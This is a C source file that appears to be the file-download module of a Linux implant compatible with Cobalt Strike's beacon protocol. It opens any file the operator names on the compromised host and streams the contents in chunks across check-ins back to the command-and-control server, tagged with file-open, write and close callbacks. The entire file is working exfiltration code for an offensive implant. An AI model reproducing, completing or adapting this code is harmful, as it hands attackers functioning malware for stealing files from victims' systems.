#include "files.h"
#include "beacon.h"
#include "commands.h"
#include "debug.h"
#include <stdio.h>
#include <stdlib.h>
#include <stdint.h>
#include <string.h>
#include <unistd.h>
#include <limits.h>
#include <arpa/inet.h>
#include <errno.h>

/*
 * Official download protocol (files.cpp):
 *
 * CALLBACK_FILE (2):
 *   [4 BE] file id
 *   [4 BE] file size
 *   [N]    full path
 *
 * CALLBACK_FILE_WRITE (8):
 *   [4 BE] file id
 *   [N]    chunk
 *
 * CALLBACK_FILE_CLOSE (9):
 *   [4 BE] file id
 *
 * Chunks are sent across check-ins via download_poll(), not all at once.
 */

typedef struct file_entry {
    uint32_t id;
    uint32_t toread;
    FILE    *handle;
    struct file_entry *next;
} file_entry_t;

static file_entry_t *download_list = NULL;
static uint32_t      download_id   = 1;
static char         *read_buffer   = NULL;

#define MAX_DL_CHUNK (512 * 1024)

static void process_close(file_entry_t *entry) {
    uint32_t id_be;
    if (entry->toread > 0) return;
    id_be = htonl(entry->id);
    command_shell_callback((char *)&id_be, 4, CALLBACK_FILE_CLOSE);
    if (entry->handle) {
        fclose(entry->handle);
        entry->handle = NULL;
    }
}

void files_download_start(const char *path_in) {
    char path[PATH_MAX];
    char fullname[PATH_MAX];
    FILE *infile;
    long long fsz;
    file_entry_t *entry;
    size_t path_len;
    size_t buf_len;
    uint8_t *out_buf;
    uint32_t id_be, size_be;
    size_t i;

    if (!path_in || !path_in[0]) {
        command_shell_callback((char *)"download: empty path", 20, CALLBACK_OUTPUT_UTF8);
        return;
    }

    /* Normalize Windows backslashes from CS client paths */
    snprintf(path, sizeof(path), "%s", path_in);
    for (i = 0; path[i]; i++) {
        if (path[i] == '\\') path[i] = '/';
    }

    infile = fopen(path, "rb");
    if (!infile) {
        char msg[PATH_MAX + 64];
        snprintf(msg, sizeof(msg), "download open failed: %s (%s)", path, strerror(errno));
        command_shell_callback(msg, (int)strlen(msg), CALLBACK_OUTPUT_UTF8);
        return;
    }

    if (fseek(infile, 0L, SEEK_END) != 0) {
        fclose(infile);
        command_shell_callback((char *)"download: seek failed", 21, CALLBACK_OUTPUT_UTF8);
        return;
    }
    fsz = (long long)ftell(infile);
    fseek(infile, 0L, SEEK_SET);

    if (fsz < 0 || fsz > 0xffffffffLL) {
        fclose(infile);
        command_shell_callback((char *)"download: invalid size", 22, CALLBACK_OUTPUT_UTF8);
        return;
    }

    if (realpath(path, fullname) == NULL)
        snprintf(fullname, sizeof(fullname), "%s", path);

    entry = (file_entry_t *)calloc(1, sizeof(*entry));
    if (!entry) {
        fclose(infile);
        return;
    }
    entry->handle = infile;
    entry->id     = download_id++;
    entry->toread = (uint32_t)fsz;
    entry->next   = download_list;
    download_list = entry;

    path_len = strlen(fullname);
    buf_len  = 4 + 4 + path_len;
    out_buf  = (uint8_t *)malloc(buf_len);
    if (!out_buf) {
        entry->toread = 0;
        process_close(entry);
        return;
    }

    id_be   = htonl(entry->id);
    size_be = htonl((uint32_t)fsz);
    memcpy(out_buf, &id_be, 4);
    memcpy(out_buf + 4, &size_be, 4);
    memcpy(out_buf + 8, fullname, path_len);

    DEBUG_PRINT("[download] start id=%u size=%lld path=%s\n",
                entry->id, fsz, fullname);
    command_shell_callback((char *)out_buf, (int)buf_len, CALLBACK_FILE);
    free(out_buf);

    if (fsz == 0)
        process_close(entry);
}

static void process_download(file_entry_t *entry, int max) {
    uint32_t id_be;
    size_t to_read, nread;

    if (!read_buffer) {
        read_buffer = (char *)malloc(4 + MAX_DL_CHUNK);
        if (!read_buffer) return;
    }

    id_be = htonl(entry->id);
    memcpy(read_buffer, &id_be, 4);

    to_read = entry->toread;
    if ((int)to_read > max) to_read = (size_t)max;
    if (to_read > MAX_DL_CHUNK) to_read = MAX_DL_CHUNK;

    nread = fread(read_buffer + 4, 1, to_read, entry->handle);
    if (nread > 0) {
        command_shell_callback(read_buffer, (int)(nread + 4), CALLBACK_FILE_WRITE);
        entry->toread -= (uint32_t)nread;
    } else {
        entry->toread = 0;
    }
    process_close(entry);
}

void files_download_stop(const uint8_t *data, size_t len) {
    uint32_t fid;
    file_entry_t *entry;
    if (len < 4) return;
    memcpy(&fid, data, 4);
    fid = ntohl(fid);
    for (entry = download_list; entry; entry = entry->next) {
        if (entry->id == fid) {
            entry->toread = 0;
            if (entry->handle) {
                fclose(entry->handle);
                entry->handle = NULL;
            }
            break;
        }
    }
}

void files_download_poll(int max_chunk) {
    file_entry_t *entry = download_list;
    file_entry_t *prev  = NULL;
    file_entry_t *next;

    if (max_chunk <= 0) max_chunk = 256 * 1024;

    while (entry) {
        if (entry->toread > 0 && entry->handle)
            process_download(entry, max_chunk);
        entry = entry->next;
    }

    /* Free completed entries */
    entry = download_list;
    prev  = NULL;
    while (entry) {
        next = entry->next;
        if (entry->toread == 0) {
            if (prev) prev->next = next;
            else download_list = next;
            free(entry);
        } else {
            prev = entry;
        }
        entry = next;
    }
}
